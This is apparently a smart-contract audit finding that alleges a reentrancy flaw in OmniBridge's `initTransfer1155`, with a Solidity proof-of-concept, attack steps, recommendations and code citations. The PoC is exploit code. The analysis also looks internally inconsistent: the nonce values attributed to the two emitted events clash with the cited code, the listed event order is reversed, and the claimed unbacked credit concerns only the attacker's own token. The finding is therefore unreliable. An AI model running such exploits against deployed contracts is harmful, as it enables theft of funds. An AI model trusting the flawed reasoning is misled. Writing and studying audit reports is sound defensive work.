### Title
Reentrancy via Malicious ERC1155 Token in `initTransfer1155` Produces Unbacked NEAR-Side Credit - (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

### Summary
`OmniBridge.initTransfer1155` makes an external call to an attacker-controlled ERC1155 token contract (`safeTransferFrom`) before emitting the `InitTransfer` event. There is no reentrancy guard. A malicious ERC1155 token can reenter `initTransfer1155` during the `safeTransferFrom` callback, causing the bridge to emit two `InitTransfer` events while only one set of tokens is ever locked, producing unbacked credit on NEAR.

### Finding Description

`initTransfer1155` follows this sequence:

1. Increment `currentOriginNonce` (line 448)
2. Call `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` (line 458–464) — external call to attacker-controlled contract
3. Call `initTransferExtension` (line 468–478)
4. Emit `BridgeTypes.InitTransfer` (line 480–489) [1](#0-0) 

The `tokenAddress` parameter is fully attacker-controlled — any address can be passed. The bridge has no allowlist for ERC1155 tokens. A malicious ERC1155 contract can override `safeTransferFrom` to reenter `initTransfer1155` during the transfer.

The only reentrancy-adjacent defense is `onERC1155Received`, which checks `operator != address(this)`: [2](#0-1) 

This check only blocks direct sends to the bridge (where `operator` would be an external address). It does **not** block the malicious ERC1155 token from calling back into `initTransfer1155` directly during its `safeTransferFrom` implementation. There is no `nonReentrant` modifier anywhere in the EVM contracts. [3](#0-2) 

The CLAUDE.md security invariant states: *"State before external calls: Always mutate state (e.g. mark nonce used) before any external call. This is the primary reentrancy defense."* The nonce is incremented before the external call, but this only prevents nonce collision — it does not prevent a second `InitTransfer` event from being emitted for a nonce that has no backing tokens. [4](#0-3) 

### Impact Explanation

NEAR's settlement layer relies exclusively on `InitTransfer` events to credit tokens. The CLAUDE.md invariant states: *"Event–transfer atomicity: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction."*

The reentrancy breaks this invariant: two `InitTransfer` events are emitted (nonces N and N+1) but only one set of tokens is locked. NEAR credits the attacker with `2 × amount` tokens while only `amount` tokens are held in the bridge. This is unauthorized creation of unbacked wrapped supply — a Critical impact.

### Likelihood Explanation

The attack requires only deploying a malicious ERC1155 contract and calling the public `initTransfer1155` function. No privileged role, leaked key, or external dependency compromise is needed. The function is fully permissionless and accepts any `tokenAddress`.

### Recommendation

1. Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to `initTransfer1155`, `initTransfer`, and `finTransfer`.
2. Alternatively, verify the bridge's actual ERC1155 balance before and after the `safeTransferFrom` call and revert if the received amount does not match `amount`.
3. Consider maintaining an allowlist of trusted ERC1155 token addresses for `initTransfer1155`.

### Proof of Concept

```solidity
contract MaliciousERC1155 {
    OmniBridge bridge;
    bool reentrant = false;

    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata) external {
        if (!reentrant) {
            reentrant = true;
            // Reentrant call: nonce N+1, actually transfers tokens
            _doTransfer(from, to, id, amount); // real transfer
            bridge.initTransfer1155(address(this), id, amount, 0, 0, "attacker.near", "");
            // ↑ emits InitTransfer(nonce=N+1, amount) — backed
        }
        // Outer call returns WITHOUT transferring tokens
        // Bridge then emits InitTransfer(nonce=N, amount) — UNBACKED
        IERC1155Receiver(to).onERC1155Received(address(bridge), from, id, amount, "");
    }
}
```

Attack steps:
1. Deploy `MaliciousERC1155` with approval granted to bridge.
2. Call `bridge.initTransfer1155(malicious, tokenId, X, 0, 0, "attacker.near", "")`.
3. Bridge emits `InitTransfer(nonce=N, amount=X)` with no tokens locked.
4. Bridge emits `InitTransfer(nonce=N+1, amount=X)` with `X` tokens locked.
5. NEAR relayer processes both events, minting `2X` tokens to attacker for cost of `X`. [5](#0-4) [2](#0-1)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L28-34)
```text
contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    SelectivePausableUpgradable,
    IERC1155Receiver
{
    using SafeERC20 for IERC20;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L439-490)
```text
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```
